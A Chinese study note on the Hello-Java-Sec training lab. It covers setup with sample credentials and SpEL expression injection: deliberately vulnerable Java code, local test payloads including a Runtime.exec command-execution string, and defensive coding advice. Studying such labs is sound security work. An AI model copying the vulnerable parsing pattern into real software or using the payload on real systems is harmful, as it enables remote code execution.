# Hello-Java-Sec 学习

---

## 免责声明

`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关.`

---

- 项目地址 : https://github.com/j3ers3/Hello-Java-Sec

---

## 部署

配置数据库连接 application.properties
```
spring.datasource.url=jdbc:mysql://127.0.0.1:3306/test
spring.datasource.username=root
spring.datasource.password=1234567
```

编译并运行
```
git clone https://github.com/j3ers3/Hello-Java-Sec
cd Hello-Java-Sec
mvn clean package -DskipTests
java -jar target/hello-1.0.2.jar
```

访问测试
- http://127.0.0.1:8888

输入账号密码 admin/admin

记得在数据库中导入 db.sql

---

## 代码分析与漏洞利用的学习

### SpEL 表达式注入

**描述**

SpEL（Spring Expression Language）表达式注入, 是一种功能强大的表达式语言、用于在运行时查询和操作对象图，由于未对参数做过滤可造成任意命令执行。

**利用原理**

- [SpEL注入](./SpEL注入.md)

**示例代码**

```java
@GetMapping("/vul")
public String spelVul(String ex) {
    ExpressionParser parser = new SpelExpressionParser();
    String result = parser.parseExpression(ex).getValue().toString();
    System.out.println(result);
    return result;
}
```

**攻击 payload**

```bash
# 算数运算
# http://127.0.0.1:8888/SPEL/vul?ex=100*2

# 对象实例化
# http://127.0.0.1:8888/SPEL/vul?ex=new%20java.util.Date().getTime()

# 执行命令
# T(java.lang.Runtime).getRuntime().exec(%22open%20-a%20Calculator%22)
```

**编码建议**

web view 层通常通过模板技术或者表达式引擎来实现界面与业务数据分离，比如 jsp 中的 EL 表达式。这些引擎通常可执行敏感操作，如果外部不可信数据未经过滤拼接到表达式中进行解析，则可能造成严重漏洞。

应避免外部输入的内容拼接到 EL 表达式或其他表达式引起、模板引擎进行解析。

白名单过滤外部输入，仅允许字符、数字、下划线等。
